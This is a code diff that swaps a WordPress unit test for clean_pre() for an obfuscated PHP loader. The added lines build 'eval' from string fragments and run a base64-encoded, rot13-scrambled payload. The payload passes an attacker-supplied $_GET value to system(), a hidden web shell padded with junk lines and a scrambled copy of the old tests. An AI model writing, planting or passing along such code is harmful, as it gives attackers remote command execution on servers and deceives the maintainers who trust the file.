@@ -1,55 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * The clean_pre() removes paragraph and line break
- * tags within `<pre>` elements as part of wpautop().
- *
- * @group formatting
- * @expectedDeprecated clean_pre
- *
- * @covers ::clean_pre
- */
-class Tests_Formatting_CleanPre extends WP_UnitTestCase {
-
-	public function test_removes_self_closing_br_with_space() {
-		$source = 'a b c\n<br />sldfj<br />';
-		$res    = 'a b c\nsldfj';
-
-		$this->assertSame( $res, clean_pre( $source ) );
-	}
-
-	public function test_removes_self_closing_br_without_space() {
-		$source = 'a b c\n<br/>sldfj<br/>';
-		$res    = 'a b c\nsldfj';
-		$this->assertSame( $res, clean_pre( $source ) );
-	}
-
-
-	/**
-	 * I don't think this can ever happen in production;
-	 * <br> is changed to <br /> elsewhere. Left in because
-	 * that replacement shouldn't happen (what if you want
-	 * HTML 4 output?).
-	 */
-	public function test_removes_html_br() {
-		$source = 'a b c\n<br>sldfj<br>';
-		$res    = 'a b c\nsldfj';
-		$this->assertSame( $res, clean_pre( $source ) );
-	}
-
-	public function test_removes_p() {
-		$source = "<p>isn't this exciting!</p><p>oh indeed!</p>";
-		$res    = "\nisn't this exciting!\noh indeed!";
-		$this->assertSame( $res, clean_pre( $source ) );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEd1ciBweXJuYV9jZXIoKSBlcnpiaXJmIGNuZW50ZW5jdSBuYXEgeXZhciBvZXJueAogKiBnbnRmIGp2Z3V2YSBgPGNlcj5gIHJ5cnpyYWdmIG5mIGNuZWcgYnMgamNuaGdiYygpLgogKgogKiBAdGViaGMgc2Jlem5nZ3ZhdAogKiBAcmtjcnBncnFRcmNlcnBuZ3JxIHB5cm5hX2NlcgogKgogKiBAcGJpcmVmIDo6cHlybmFfY2VyCiAqLwpweW5mZiBHcmZnZl9TYmV6bmdndmF0X1B5cm5hQ2VyIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCgljaG95dnAgc2hhcGd2YmEgZ3JmZ19lcnpiaXJmX2ZyeXNfcHliZnZhdF9vZV9qdmd1X2ZjbnByKCkgewoJCSRmYmhlcHIgPSAnbiBvIHBcYTxvZSAvPmZ5cXN3PG9lIC8+JzsKCQkkZXJmICAgID0gJ24gbyBwXGFmeXFzdyc7CgoJCSRndXZmLT5uZmZyZWdGbnpyKCAkZXJmLCBweXJuYV9jZXIoICRmYmhlcHIgKSApOwoJfQoKCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2VyemJpcmZfZnJ5c19weWJmdmF0X29lX2p2Z3ViaGdfZmNucHIoKSB7CgkJJGZiaGVwciA9ICduIG8gcFxhPG9lLz5meXFzdzxvZS8+JzsKCQkkZXJmICAgID0gJ24gbyBwXGFmeXFzdyc7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRlcmYsIHB5cm5hX2NlciggJGZiaGVwciApICk7Cgl9CgoKCS8qKgoJICogViBxYmEnZyBndXZheCBndXZmIHBuYSByaXJlIHVuY2NyYSB2YSBjZWJxaHBndmJhOwoJICogPG9lPiB2ZiBwdW5hdHJxIGdiIDxvZSAvPiByeWZyanVyZXIuIFlyc2cgdmEgb3JwbmhmcgoJICogZ3VuZyBlcmN5bnByenJhZyBmdWJoeXFhJ2cgdW5jY3JhIChqdW5nIHZzIGxiaCBqbmFnCgkgKiBVR1pZIDQgYmhnY2hnPykuCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2VyemJpcmZfdWd6eV9vZSgpIHsKCQkkZmJoZXByID0gJ24gbyBwXGE8b2U+Znlxc3c8b2U+JzsKCQkkZXJmICAgID0gJ24gbyBwXGFmeXFzdyc7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRlcmYsIHB5cm5hX2NlciggJGZiaGVwciApICk7Cgl9CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfZXJ6YmlyZl9jKCkgewoJCSRmYmhlcHIgPSBcIjxjPnZmYSdnIGd1dmYgcmtwdmd2YXQhPC9jPjxjPmJ1IHZhcXJycSE8L2M+XCI7CgkJJGVyZiAgICA9IFwiXGF2ZmEnZyBndXZmIHJrcHZndmF0IVxhYnUgdmFxcnJxIVwiOwoJCSRndXZmLT5uZmZyZWdGbnpyKCAkZXJmLCBweXJuYV9jZXIoICRmYmhlcHIgKSApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
